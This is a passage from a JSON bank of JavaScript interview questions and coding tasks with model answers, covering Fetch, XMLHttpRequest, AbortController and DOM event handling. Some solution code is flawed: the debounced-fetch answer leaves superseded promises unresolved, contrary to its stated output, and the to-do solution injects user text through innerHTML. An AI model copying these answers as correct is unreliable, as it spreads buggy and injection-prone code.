          ],
          "example": "```typescript\nfetch('https://httpstat.us/404') // This URL always returns 404\n  .then(response => {\n    console.log('Response received, status:', response.status);\n    if (!response.ok) {\n      // response.ok is false for 404, so this block executes\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    return response.json();\n  })\n  .then(data => console.log('Success:', data))\n  .catch(error => {\n    // The error thrown in the first .then() is caught here\n    console.error('Caught error:', error.message); // Outputs: Caught error: HTTP error! status: 404\n  });\n```\nFetch promises only reject on network errors (e.g., DNS lookup failure, no internet connection). For HTTP error statuses like 404 or 500, the promise *resolves* with a `Response` object where `response.ok` is `false`. It's crucial to explicitly check `response.ok` and throw an error yourself to propagate HTTP errors to the `.catch()` block.",
          "tags": [
            "Fetch API",
            "AJAX",
            "Error Handling",
            "Promises"
          ],
          "prerequisites": [
            "javascript_promises",
            "http_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 10,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ajax_fetch_api_3",
          "topic": "XMLHttpRequest - Ready States",
          "level": "medium",
          "type": "mcq",
          "question": "In `XMLHttpRequest`, what does `xhr.readyState === 4` signify in the `onreadystatechange` handler?",
          "answer": "The request has completed, and the response is available.",
          "options": [
            "The request has been opened.",
            "Headers have been received.",
            "The response is currently being downloaded.",
            "The request has completed, and the response is available."
          ],
          "analysisPoints": [
            "Understanding XHR `readyState` values.",
            "Knowing the final state of an XHR request.",
            "Distinguishing between partial and complete responses."
          ],
          "keyConcepts": [
            "XMLHttpRequest",
            "readyState",
            "AJAX",
            "HTTP Request Lifecycle"
          ],
          "evaluationCriteria": [
            "Correct identification of the `readyState` 4 meaning.",
            "Knowledge of XHR lifecycle."
          ],
          "example": "```typescript\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', 'some-url', true);\nxhr.onreadystatechange = function() {\n  // readyState 0: UNSENT\n  // readyState 1: OPENED\n  // readyState 2: HEADERS_RECEIVED\n  // readyState 3: LOADING\n  if (xhr.readyState === 4) { // DONE\n    if (xhr.status === 200) {\n      console.log('Request successful! Response:', xhr.responseText);\n    } else {\n      console.error('Request failed. Status:', xhr.status);\n    }\n  }\n};\nxhr.send();\n```\n`xhr.readyState === 4` indicates that the `XMLHttpRequest` operation is complete. At this point, the `xhr.status` and `xhr.responseText` (or `xhr.response`) properties will contain the full HTTP response from the server, whether it was successful or an error.",
          "tags": [
            "XMLHttpRequest",
            "AJAX",
            "readyState",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_ajax_fetch_api"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ajax_fetch_api_4",
          "topic": "Fetch API vs XMLHttpRequest",
          "level": "open",
          "type": "open",
          "question": "Compare and contrast `XMLHttpRequest` with the `Fetch API`. Discuss their main differences, advantages, and disadvantages. Which one would you prefer for new development and why?",
          "answer": "**XMLHttpRequest (XHR)**\n\n*   **Nature:** Older, callback-based API. Event-driven model (`onreadystatechange`, `onload`, `onerror`).\n*   **Pros:**\n    *   More control over request lifecycle (e.g., progress events).\n    *   Legacy support (works in older browsers).\n*   **Cons:**\n    *   **Callback Hell:** Complex sequences of requests lead to deeply nested callbacks, making code hard to read and maintain.\n    *   Verbose API: Requires more boilerplate code to set up and manage requests.\n    *   Error Handling: HTTP errors (e.g., 404, 500) are not distinct from network errors; you must manually check `status`.\n    *   No built-in support for Promises, requiring manual wrapping for modern async patterns.\n    *   Doesn't support streams by default.\n\n**Fetch API**\n\n*   **Nature:** Modern, Promise-based API. Provides a more powerful and flexible mechanism for making network requests.\n*   **Pros:**\n    *   **Promise-based:** Naturally handles asynchronous operations, leading to cleaner code with `.then()`, `.catch()`, and `async/await`.\n    *   Simpler API: Less boilerplate code compared to XHR.\n    *   Separation of Concerns: HTTP errors don't cause a promise rejection by default, forcing explicit error checks (`response.ok`). This is often considered an advantage as successful network requests (even with 4xx/5xx status) are distinct from actual network failures.\n    *   Supports advanced features: Streams, `AbortController` for cancellation, CORS control with `mode` option.\n    *   More aligned with modern JavaScript syntax and patterns.\n*   **Cons:**\n    *   No built-in `onprogress` event handling like XHR (though you can implement this with ReadableStream).\n    *   Does not reject the promise on HTTP error status codes (e.g., 404, 500); requires manual `response.ok` check.\n    *   Less robust browser support for very old browsers (though polyfills exist).\n\n**Which one to prefer for new development and why?**\n\nFor **new development**, I would strongly prefer the **Fetch API**. \n\n**Reasons:**\n1.  **Readability and Maintainability (Promises/Async/Await):** The promise-based nature of Fetch, especially when combined with `async/await`, makes asynchronous code significantly easier to read, write, and debug compared to the nested callbacks often associated with XHR. This directly reduces 'callback hell'.\n2.  **Modern API Design:** Fetch is designed with modern web development patterns in mind. Its `Response` object and options are more intuitive and powerful for handling various aspects of HTTP requests (headers, body, credentials, etc.).\n3.  **Built-in Cancellation (`AbortController`):** The native support for request cancellation via `AbortController` is a critical feature for managing long-running requests or preventing race conditions in dynamic UIs, which is more cumbersome to implement with XHR.\n4.  **Flexibility and Features:** Fetch offers better support for features like Streams, which are becoming increasingly important for handling large data payloads efficiently.\n\nWhile XHR still has its place for very specific legacy scenarios or highly granular control over certain aspects (like progress event reporting in old browsers without alternative solutions), Fetch API is generally superior for building robust, modern, and maintainable web applications.",
          "options": [],
          "analysisPoints": [
            "Comprehensive comparison covering nature, pros, and cons of both APIs.",
            "Clear statement of preference with strong justifications.",
            "Discussion of key features like Promises, `AbortController`, error handling, and verbosity."
          ],
          "keyConcepts": [
            "Fetch API",
            "XMLHttpRequest",
            "Promises",
            "Async/Await",
            "Callback Hell",
            "Error Handling",
            "AbortController",
            "HTTP"
          ],
          "evaluationCriteria": [
            "Depth and accuracy of the comparison.",
            "Sound reasoning for the preferred choice.",
            "Demonstration of practical experience and architectural thinking."
          ],
          "example": "",
          "tags": [
            "AJAX",
            "Fetch API",
            "XMLHttpRequest",
            "Comparison",
            "Open-ended",
            "Advanced"
          ],
          "prerequisites": [
            "theory_ajax_fetch_api",
            "javascript_promises",
            "javascript_async_await"
          ],
          "complexity": 9,
          "interviewFrequency": 10,
          "learningPath": "advanced"
        },
        {
          "id": "question_ajax_fetch_api_5",
          "topic": "AbortController",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the purpose of `AbortController` in the context of the Fetch API?",
          "answer": "`AbortController` provides a way to cancel one or more ongoing `fetch` requests.",
          "options": [],
          "analysisPoints": [
            "Recall the core functionality of `AbortController`."
          ],
          "keyConcepts": [
            "AbortController",
            "Fetch API",
            "Request Cancellation",
            "Asynchronous Operations"
          ],
          "evaluationCriteria": [
            "Quick and accurate recall."
          ],
          "example": "```typescript\nconst controller = new AbortController();\nconst signal = controller.signal;\n\nfetch('https://api.example.com/data', { signal })\n  .catch(error => {\n    if (error.name === 'AbortError') {\n      console.log('Fetch request was aborted.');\n    }\n  });\n\n// To cancel the request:\ncontroller.abort();\n```",
          "tags": [
            "Fetch API",
            "AbortController",
            "Flashcard",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_ajax_fetch_api"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ajax_fetch_api_6",
          "topic": "Fetch API - POST Request",
          "level": "medium",
          "type": "code",
          "question": "Write a JavaScript function `createPost(title, body, userId)` that uses the Fetch API to send a POST request to `https://jsonplaceholder.typicode.com/posts`. The function should return a Promise that resolves with the created post data or rejects with an error message.\n\nEnsure that:\n1.  The `Content-Type` header is set to `application/json`.\n2.  The request body is correctly JSON stringified.\n3.  HTTP errors (e.g., 4xx or 5xx) are properly handled and result in a rejected promise with a descriptive error message.",
          "answer": "```typescript\nasync function createPost(title, body, userId) {\n  const postData = {\n    title: title,\n    body: body,\n    userId: userId,\n  };\n\n  try {\n    const response = await fetch('https://jsonplaceholder.typicode.com/posts', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n        // 'Accept': 'application/json' // Often good practice to include\n      },\n      body: JSON.stringify(postData), // Convert JavaScript object to JSON string\n    });\n\n    // Check if the response status is OK (200-299 range)\n    if (!response.ok) {\n      // For non-OK responses, throw an Error which will be caught by the catch block\n      const errorText = await response.text(); // Get more detailed error from body if available\n      throw new Error(`HTTP error! Status: ${response.status}. Message: ${errorText || response.statusText}`);\n    }\n\n    // Parse the response body as JSON\n    const data = await response.json();\n    return data; // Return the created post data\n\n  } catch (error) {\n    // Catch network errors or errors thrown from the response.ok check\n    console.error('Error creating post:', error);\n    throw new Error(`Failed to create post: ${error.message}`); // Re-throw with a more user-friendly message\n  }\n}\n\n// Example Usage:\ncreatePost('My New Title', 'This is the body of my new post.', 1)\n  .then(newPost => {\n    console.log('Post created successfully:', newPost);\n    // The JSONPlaceholder API will return an object with an 'id' for new posts\n    // Example output: { title: 'My New Title', body: '...', userId: 1, id: 101 }\n  })\n  .catch(err => {\n    console.error('Failed to create post:', err.message);\n  });\n\n// Example with invalid data (might trigger server-side validation error if API was stricter)\ncreatePost('', '', null) // Sending empty data to test error handling\n  .then(response => console.log('Created (possibly invalid) post:', response))\n  .catch(err => console.error('Attempt to create invalid post failed:', err.message));\n```",
          "options": [],
          "analysisPoints": [
            "Correctly sets HTTP method to POST.",
            "Sets `Content-Type` header.",
            "Uses `JSON.stringify` for the request body.",
            "Properly uses `await` for promise resolution.",
            "Includes robust error handling for HTTP status codes.",
            "Handles potential network errors via `try...catch`.",
            "Returns a Promise as required."
          ],
          "keyConcepts": [
            "Fetch API",
            "POST Request",
            "Headers",
            "JSON.stringify",
            "Async/Await",
            "Error Handling",
            "Promises"
          ],
          "evaluationCriteria": [
            "Code is functional and follows best practices for Fetch POST requests.",
            "Error handling is comprehensive.",
            "Demonstrates understanding of asynchronous patterns.",
            "Code is clean and readable."
          ],
          "example": "",
          "tags": [
            "Fetch API",
            "AJAX",
            "Code Challenge",
            "POST",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_ajax_fetch_api",
            "javascript_async_await"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ajax_fetch_api_7",
          "topic": "Fetch API - AbortController",
          "level": "hard",
          "type": "code",
          "question": "Implement a `debounceFetch(url, delay)` function that wraps a `fetch` call and debounces it. If the function is called multiple times within the `delay` period, only the *last* call should trigger a network request, and any previous ongoing requests should be aborted. The function should return a Promise that resolves with the fetch data or rejects with an error (including `AbortError`).\n\n**Hints:**\n*   You'll need an `AbortController` instance.\n*   Store the controller instance to access it later.\n*   Use `setTimeout` for debouncing.\n*   Remember to `clearTimeout` if the function is called again within the delay.\n\n```javascript\n// Example Usage (conceptual):\n// const debouncedFetcher = debounceFetch('https://api.example.com/data', 300);\n// debouncedFetcher().then(data => console.log(data)).catch(err => console.error(err));\n// debouncedFetcher().then(...); // This will cancel the previous one if called within 300ms\n```",
          "answer": "```javascript\nlet activeController = null; // Stores the current AbortController instance\nlet debounceTimer = null;    // Stores the timeout ID for debouncing\n\n/**\n * Creates a debounced fetch function that cancels previous ongoing requests.\n * @param {string} url The URL to fetch.\n * @param {number} delay The debounce delay in milliseconds.\n * @returns {Function} A function that, when called, initiates a debounced fetch.\n */\nfunction debounceFetch(url, delay) {\n  return function() {\n    // Return a new Promise for each call to debounceFetch's inner function\n    return new Promise((resolve, reject) => {\n      // 1. Clear any existing debounce timer\n      if (debounceTimer) {\n        clearTimeout(debounceTimer);\n      }\n\n      // 2. If there's an active request, abort it\n      if (activeController) {\n        activeController.abort();\n        console.log('Aborting previous request...');\n      }\n\n      // 3. Create a new AbortController for the upcoming request\n      const newController = new AbortController();\n      const signal = newController.signal;\n      activeController = newController; // Store this new controller as the active one\n\n      // 4. Set a new debounce timer\n      debounceTimer = setTimeout(() => {\n        // Perform the fetch request after the delay\n        fetch(url, { signal })\n          .then(response => {\n            // Check if this response is from the currently active controller\n            // This guards against race conditions where a *very fast* prior request\n            // might resolve after a subsequent one has started but before it's aborted.\n            if (activeController !== newController) {\n                // This request was superseded by a newer one, ignore its resolution\n                return Promise.reject(new Error('Stale request result ignored'));\n            }\n\n            if (!response.ok) {\n              throw new Error(`HTTP error! status: ${response.status}`);\n            }\n            return response.json();\n          })\n          .then(data => {\n            if (activeController === newController) { // Ensure current controller's response\n                resolve(data);\n            }\n          })\n          .catch(error => {\n            if (error.name === 'AbortError') {\n              console.warn('Fetch request was aborted intentionally.');\n              reject(new Error('Request aborted.')); // Indicate cancellation to user of the promise\n            } else if (error.message === 'Stale request result ignored') {\n                console.log('Stale request result ignored.');\n                // Do not reject the current promise here, as it was superseded\n                // The promise for the *latest* call is the one we care about.\n            } else {\n              console.error('Fetch error:', error);\n              reject(new Error(`Fetch failed: ${error.message}`));\n            }\n          })\n          .finally(() => {\n            // Clean up the active controller reference if this request just finished\n            if (activeController === newController) {\n                activeController = null;\n            }\n            debounceTimer = null; // Clear the timer ID\n          });\n      }, delay);\n    });\n  };\n}\n\n// --- Example Usage ---\nconst debouncedApiCall = debounceFetch('https://jsonplaceholder.typicode.com/posts/1', 500);\n\nconsole.log('Calling 1st time');\ndebouncedApiCall()\n  .then(data => console.log('1st call resolved (should be the last one):', data.title))\n  .catch(err => console.error('1st call error:', err.message));\n\nsetTimeout(() => {\n  console.log('Calling 2nd time (within debounce period)');\n  debouncedApiCall()\n    .then(data => console.log('2nd call resolved (should be the last one):', data.title))\n    .catch(err => console.error('2nd call error:', err.message));\n}, 200);\n\nsetTimeout(() => {\n  console.log('Calling 3rd time (within debounce period of 2nd)');\n  debouncedApiCall()\n    .then(data => console.log('3rd call resolved (THIS should be the last one):', data.title))\n    .catch(err => console.error('3rd call error:', err.message));\n}, 400);\n\nsetTimeout(() => {\n  console.log('Calling 4th time (after delay, starting new sequence)');\n  debouncedApiCall()\n    .then(data => console.log('4th call resolved (should be the last one of this sequence):', data.title))\n    .catch(err => console.error('4th call error:', err.message));\n}, 1200);\n\n/* Expected console output (approximate timing):\nCalling 1st time\nCalling 2nd time (within debounce period) -> Aborting previous request...\nCalling 3rd time (within debounce period of 2nd) -> Aborting previous request...\nFetch request was aborted intentionally. (for 1st and 2nd calls' promises)\n3rd call resolved (THIS should be the last one): ...\nCalling 4th time (after delay, starting new sequence)\n4th call resolved (should be the last one of this sequence): ...\n*/\n```",
          "options": [],
          "analysisPoints": [
            "Correct implementation of debouncing logic (`setTimeout`, `clearTimeout`).",
            "Correct use of `AbortController` to cancel previous requests.",
            "Proper handling of `AbortError` in the catch block.",
            "Ensuring the returned promise resolves/rejects correctly based on the *latest* fetch attempt.",
            "Managing `activeController` and `debounceTimer` state correctly across calls."
          ],
          "keyConcepts": [
            "Debouncing",
            "Fetch API",
            "AbortController",
            "Promises",
            "Async/Await",
            "Error Handling",
            "Higher-Order Functions",
            "Cancellation"
          ],
          "evaluationCriteria": [
            "Solution correctly implements debouncing and cancellation.",
            "Error handling for `AbortError` is robust.",
            "Code is well-structured and handles edge cases of rapid calls.",
            "Demonstrates advanced JavaScript concepts for asynchronous control."
          ],
          "example": "",
          "tags": [
            "Fetch API",
            "AJAX",
            "Code Challenge",
            "Promises",
            "AbortController",
            "Debouncing",
            "Advanced"
          ],
          "prerequisites": [
            "theory_ajax_fetch_api",
            "javascript_async",
            "javascript_promises"
          ],
          "complexity": 10,
          "interviewFrequency": 8,
          "learningPath": "expert"
        }
      ],
      "tasks": [
        {
          "id": "task_dom_events_1",
          "title": "Interactive To-Do List with Event Delegation",
          "description": "\nCreate a simple interactive To-Do list. The application should allow users to add new tasks, mark tasks as completed, and delete tasks. All interaction with list items (marking/deleting) should leverage event delegation.\n\n**Requirements:**\n1.  **Add Task:** An input field and a button to add new tasks to the list. New tasks should be appended as `<li>` elements inside an unordered list (`<ul>`).\n2.  **Mark as Completed:** Clicking on a list item (`<li>`) should toggle a 'completed' class on that item, changing its appearance (e.g., strikethrough text).\n3.  **Delete Task:** Each list item should have a small 'X' button or icon next to it. Clicking this button should remove the corresponding list item from the DOM.\n4.  **Event Delegation:** Both 'mark as completed' and 'delete task' functionalities **must** use event delegation by attaching a single event listener to the parent `<ul>` element.\n5.  **Dynamic Content:** Ensure that new tasks added to the list automatically inherit the 'mark as completed' and 'delete' functionalities without needing new event listeners.\n\n**HTML Structure:**\n```html\n<input type=\"text\" id=\"taskInput\" placeholder=\"Add a new task\">\n<button id=\"addTaskBtn\">Add Task</button>\n<ul id=\"todoList\">\n  <!-- Tasks will be added here -->\n</ul>\n```\n",
          "difficulty": "medium",
          "startingCode": "document.addEventListener('DOMContentLoaded', () => {\n  const taskInput = document.getElementById('taskInput');\n  const addTaskBtn = document.getElementById('addTaskBtn');\n  const todoList = document.getElementById('todoList');\n\n  // Add Task functionality\n  addTaskBtn.addEventListener('click', () => {\n    const taskText = taskInput.value.trim();\n    if (taskText !== '') {\n      const listItem = document.createElement('li');\n      listItem.innerHTML = `\n        <span>${taskText}</span>\n        <button class=\"delete-btn\">X</button>\n      `;\n      todoList.appendChild(listItem);\n      taskInput.value = ''; // Clear input\n    }\n  });\n\n  // TODO: Implement event delegation for marking/deleting tasks here\n  // Hint: Attach a single listener to `todoList`\n  // Check event.target.classList for 'delete-btn' or event.target.tagName for 'SPAN' for toggling\n\n});\n\n// Basic CSS for visual feedback (can be added to a <style> tag or CSS file)\n/*\n#todoList li {\n  padding: 8px;\n  margin-bottom: 5px;\n  border: 1px solid #ddd;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  background-color: #f9f9f9;\n}\n\n#todoList li.completed span {\n  text-decoration: line-through;\n  color: #888;\n}\n\n.delete-btn {\n  background-color: #f44336;\n  color: white;\n  border: none;\n  padding: 5px 10px;\n  cursor: pointer;\n  border-radius: 3px;\n}\n\n.delete-btn:hover {\n  background-color: #d32f2f;\n}\n*/\n",
          "solutionCode": "document.addEventListener('DOMContentLoaded', () => {\n  const taskInput = document.getElementById('taskInput');\n  const addTaskBtn = document.getElementById('addTaskBtn');\n  const todoList = document.getElementById('todoList');\n\n  // Add Task functionality\n  addTaskBtn.addEventListener('click', () => {\n    const taskText = taskInput.value.trim();\n    if (taskText !== '') {\n      const listItem = document.createElement('li');\n      // Use a span for the text content to make it a distinct target for toggling\n      listItem.innerHTML = `\n        <span>${taskText}</span>\n        <button class=\"delete-btn\">X</button>\n      `;\n      todoList.appendChild(listItem);\n      taskInput.value = ''; // Clear input\n    }\n  });\n\n  // Event Delegation for Marking as Completed and Deleting Tasks\n  todoList.addEventListener('click', (event) => {\n    const target = event.target; // The actual element that was clicked\n\n    // 1. Delete Task\n    if (target.classList.contains('delete-btn')) {\n      const listItemToDelete = target.closest('li'); // Find the nearest parent <li>\n      if (listItemToDelete) {\n        todoList.removeChild(listItemToDelete);\n        console.log('Task deleted:', listItemToDelete.querySelector('span').textContent);\n      }\n    } \n    // 2. Mark as Completed (toggle 'completed' class on the li item)\n    // Check if the clicked element is the span (task text) or the li itself\n    else if (target.tagName === 'SPAN' && target.parentElement.tagName === 'LI') {\n      target.parentElement.classList.toggle('completed');\n      console.log('Task status toggled for:', target.textContent);\n    } else if (target.tagName === 'LI') {\n      // If clicking directly on the LI (and not the span), also toggle\n      target.classList.toggle('completed');\n      console.log('Task status toggled for:', target.querySelector('span').textContent);\n    }\n  });\n});\n\n/* Add this CSS to your <style> tag or CSS file */\n/*\n#taskInput {\n  padding: 8px;\n  width: 200px;\n  margin-right: 10px;\n}\n#addTaskBtn {\n  padding: 8px 15px;\n  background-color: #4CAF50;\n  color: white;\n  border: none;\n  cursor: pointer;\n}\n#addTaskBtn:hover {\n  background-color: #45a049;\n}\n\n#todoList {\n  list-style-type: none;\n  padding: 0;\n  margin-top: 20px;\n  border: 1px solid #eee;\n  border-radius: 5px;\n}\n\n#todoList li {\n  padding: 10px 15px;\n  margin-bottom: 0px;\n  border-bottom: 1px solid #eee;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  background-color: #fff;\n  transition: background-color 0.2s ease;\n}\n#todoList li:last-child {\n  border-bottom: none;\n}\n#todoList li:hover {\n  background-color: #f5f5f5;\n}\n\n#todoList li.completed {\n  background-color: #e0ffe0; /* Light green background */\n}\n\n#todoList li.completed span {\n  text-decoration: line-through;\n  color: #888;\n  font-style: italic;\n}\n\n.delete-btn {\n  background-color: #f44336;\n  color: white;\n  border: none;\n  padding: 5px 10px;\n  border-radius: 3px;\n  cursor: pointer;\n  font-size: 0.8em;\n}\n\n.delete-btn:hover {\n  background-color: #d32f2f;\n}\n*/\n",
          "testCases": [
            "Adding a new task via input and button should append a new `<li>` to `todoList`.",
            "Clicking an existing `<li>` (its text part) should toggle its 'completed' class.",
            "Clicking a dynamically added `<li>` (its text part) should toggle its 'completed' class.",
            "Clicking the 'X' button on an existing `<li>` should remove that `<li>` from the DOM.",
            "Clicking the 'X' button on a dynamically added `<li>` should remove that `<li>` from the DOM.",
            "Clicking outside any `<li>` but within the `<ul>` (if allowed by padding/margin) should not trigger any task-specific actions.",
            "Submitting an empty task text should not add a new `<li>`."
          ],
          "hints": [
            "For event delegation, attach the `click` listener to the `todoList` (the `<ul>` element).",
            "Inside the event listener, use `event.target` to identify which specific element was clicked.",
            "To check if the clicked element is the delete button, use `event.target.classList.contains('delete-btn')`.",
            "To check if the clicked element is the task text (or the list item itself), you can check `event.target.tagName` or use `event.target.closest('li')` to find the parent list item.",
            "When deleting, use `parentElement.removeChild(childElement)` to remove the `<li>`."
          ],
          "tags": [
            "DOM",
            "Events",
            "Event Delegation",
            "JavaScript",
            "Frontend",
            "UI"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "theory_dom_events",
            "dom_manipulation_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "event_bubbling",
            "event.target",
            "dom_manipulation",
            "dynamic_content"
          ]
        },
        {
          "id": "task_event_methods_1",
          "title": "Nested Modal Interaction Control",
          "description": "\nImplement a scenario with a modal dialog that demonstrates the use of `event.stopPropagation()` and `event.preventDefault()` to control complex nested interactions.\n\n**Requirements:**\n1.  **Modal Overlay:** A full-screen overlay (`#modalOverlay`) that appears when a 'Open Modal' button is clicked. Clicking the overlay itself should close the modal.\n2.  **Modal Content:** Inside the overlay, there should be a central modal dialog box (`#modalContent`) with some text and a 'Close' button.\n3.  **Prevent Overlay Closure:** Clicking *inside* `#modalContent` (but not the 'Close' button) should **not** close the modal. This requires `event.stopPropagation()`.\n4.  **Prevent Default Form Submission:** Inside `#modalContent`, add a simple form (`<form>`) with an input and a submit button. Submitting this form should **not** reload the page but instead log a message to the console. This requires `event.preventDefault()`.\n5.  **Combined Use Case:** The 'Close' button inside `#modalContent` should close the modal. If this button were part of a form, ensure its click doesn't trigger form submission or bubble up to close the modal via the overlay listener. (Though for simplicity, it can just close the modal here). For an additional challenge, make it a submit button that *doesn't* submit the form, and *does* stop bubbling up to the overlay.\n\n**HTML Structure:**\n```html\n<button id=\"openModalBtn\">Open Modal</button>\n\n<div id=\"modalOverlay\" style=\"display: none;\">\n  <div id=\"modalContent\">\n    <h2>Modal Title</h2>\n    <p>This is modal content.</p>\n    <form id=\"modalForm\">\n      <input type=\"text\" placeholder=\"Enter something\">\n      <button type=\"submit\" id=\"formSubmitBtn\">Submit Form (Prevent Default)</button>\n    </form>\n    <button id=\"closeModalBtn\">Close Modal</button>\n  </div>\n</div>\n```\n\n**CSS (minimal for visibility, include in solution):**\n```css\n#modalOverlay {\n  position: fixed;\n  top: 0; left: 0; right: 0; bottom: 0;\n  background: rgba(0, 0, 0, 0.5);\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  z-index: 1000;\n}\n\n#modalContent {\n  background: white;\n  padding: 20px;\n  border-radius: 8px;\n  width: 80%;\n  max-width: 500px;\n  box-shadow: 0 4px 8px rgba(0,0,0,0.2);\n}\n\n#modalForm {\n  margin-top: 15px;\n  border: 1px dashed #ccc;\n  padding: 10px;\n}\n\n#modalForm input, #modalForm button {\n  margin-right: 5px;\n}\n```\n",
          "difficulty": "hard",
          "startingCode": "document.addEventListener('DOMContentLoaded', () => {\n  const openModalBtn = document.getElementById('openModalBtn');\n  const modalOverlay = document.getElementById('modalOverlay');\n  const modalContent = document.getElementById('modalContent');\n  const closeModalBtn = document.getElementById('closeModalBtn');\n  const modalForm = document.getElementById('modalForm');\n  const formSubmitBtn = document.getElementById('formSubmitBtn');\n\n  function openModal() {\n    modalOverlay.style.display = 'flex';\n  }\n\n  function closeModal() {\n    modalOverlay.style.display = 'none';\n  }\n\n  openModalBtn.addEventListener('click', openModal);\n  closeModalBtn.addEventListener('click', closeModal);\n\n  // TODO: Implement logic for #modalOverlay, #modalContent, and #modalForm\n  // 1. Clicking overlay closes modal.\n  // 2. Clicking inside modalContent *doesn't* close modal (stopPropagation).\n  // 3. Submitting modalForm *doesn't* reload page (preventDefault).\n  // 4. (Optional) Make closeModalBtn also stop propagation from the form.\n\n});\n",
          "solutionCode": "document.addEventListener('DOMContentLoaded', () => {\n  const openModalBtn = document.getElementById('openModalBtn');\n  const modalOverlay = document.getElementById('modalOverlay');\n  const modalContent = document.getElementById('modalContent');\n  const closeModalBtn = document.getElementById('closeModalBtn');\n  const modalForm = document.getElementById('modalForm');\n  const formSubmitBtn = document.getElementById('formSubmitBtn');\n\n  function openModal() {\n    modalOverlay.style.display = 'flex';\n  }\n\n  function closeModal() {\n    modalOverlay.style.display = 'none';\n  }\n\n  openModalBtn.addEventListener('click', openModal);\n\n  // 1. Clicking overlay closes modal.\n  // This listener must be on the overlay itself, not its children.\n  modalOverlay.addEventListener('click', closeModal);\n\n  // 2. Clicking inside modalContent *doesn't* close modal.\n  // This is crucial: the click event from modalContent would bubble up to modalOverlay.\n  // We stop that bubbling here.\n  modalContent.addEventListener('click', (event) => {\n    event.stopPropagation(); // Prevents clicks inside the content from reaching the overlay\n    console.log('Clicked inside modal content (propagation stopped).');\n  });\n\n  // 3. Submitting modalForm *doesn't* reload page (preventDefault).\n  modalForm.addEventListener('submit', (event) => {\n    event.preventDefault(); // Stops the default form submission behavior (page reload)\n    console.log('Form submitted! Default action prevented.');\n    const inputValue = modalForm.querySelector('input').value;\n    console.log('Form input value:', inputValue);\n    // In a real app, you'd send an AJAX request here.\n  });\n\n  // 4. Close Modal Button: Closes the modal. \n  // It's good practice to also stop propagation if it's nested in a clickable area,\n  // e.g., if clicking the button would otherwise close the modal via a parent click.\n  closeModalBtn.addEventListener('click', (event) => {\n    event.stopPropagation(); // Prevent this click from bubbling to modalContent or modalOverlay\n    closeModal();\n    console.log('Modal closed by button.');\n  });\n\n});\n",
          "testCases": [
            "Clicking 'Open Modal' button should make the modal overlay visible.",
            "Clicking the gray area (modal overlay) outside `modalContent` should close the modal.",
            "Clicking inside `modalContent` (e.g., on text or an input field) should *not* close the modal.",
            "Clicking the 'Submit Form' button inside the modal should log 'Form submitted! Default action prevented.' and *not* cause a page reload.",
            "Clicking the 'Close Modal' button should close the modal.",
            "Ensure no console errors or unexpected behaviors when rapidly clicking or clicking different areas."
          ],
          "hints": [
            "The `modalOverlay` is the ideal place for the 'close modal on outside click' listener.",
            "To prevent `modalContent` clicks from closing the modal, you need to stop the event from bubbling up from `modalContent` to `modalOverlay`.",
            "For the form, remember that `submit` is a special event. You'll need to listen for the `submit` event on the `form` element itself, not just the button.",
            "`event.stopPropagation()` stops the event from reaching parent elements, while `event.preventDefault()` stops the browser's default action for that event.",
            "Think about where the `event.target` will be for each interaction."
          ],
          "tags": [
            "DOM",
            "Events",
            "stopPropagation",
            "preventDefault",
            "Modal",
            "UI",
            "JavaScript"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_dom_events",
            "theory_event_methods",
            "dom_manipulation_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "event_bubbling",
            "event.target",
            "form_handling"
          ]
        },
        {
          "id": "task_dom_traversal_1",
          "title": "Dynamic Tree Navigation with Highlighting",
          "description": "\nBuild a dynamic navigation structure that allows users to highlight clicked items and their ancestors, while de-highlighting siblings and their children. This task will test your understanding of DOM traversal methods.\n\n**Requirements:**\n1.  **HTML Structure:** Create a nested unordered list (`<ul>` and `<li>`) that represents a file system or menu structure. Ensure some `<li>` elements have nested `<ul>`s.\n    ```html\n    <ul id=\"fileSystem\">\n      <li>Folder 1\n        <ul>\n          <li>File A</li>\n          <li>File B</li>\n        </ul>\n      </li>\n      <li>Folder 2\n        <ul>\n          <li>Folder 2.1\n            <ul>\n              <li>File C</li>\n            </ul>\n          </li>\n          <li>File D</li>\n        </ul>\n      </li>\n      <li>File E</li>\n    </ul>\n    ```\n2.  **Click Event:** Attach a single event listener to the root `<ul>` (`#fileSystem`) using event delegation.\n3.  **Highlighting:** When a `<li>` element is clicked:\n    *   Add a `highlighted` class to the clicked `<li>`.\n    *   Add a `highlighted` class to *all* its parent `<li>` elements up to the root.\n4.  **De-highlighting:** Simultaneously, remove the `highlighted` class from:\n    *   All sibling `<li>` elements of the clicked `<li>`.\n    *   All children `<li>` elements of all sibling `<li>` elements (i.e., hide everything 'else' at the same level and below).\n    *   All previously highlighted elements that are no longer part of the current path.\n5.  **Reset:** Clicking outside any `<li>` (but within `#fileSystem` if possible, or a reset button) should remove all `highlighted` classes.\n\n**CSS (minimal, include in solution):**\n```css\n.highlighted {\n  background-color: yellow;\n  font-weight: bold;\n}\n\nul {\n  list-style-type: none;\n  padding-left: 20px;\n}\n\nli {\n  cursor: pointer;\n  margin: 5px 0;\n  padding: 3px;\n  border: 1px solid transparent;\n}\n\nli:hover {\n  border-color: #ccc;\n}\n```\n",
          "difficulty": "hard",
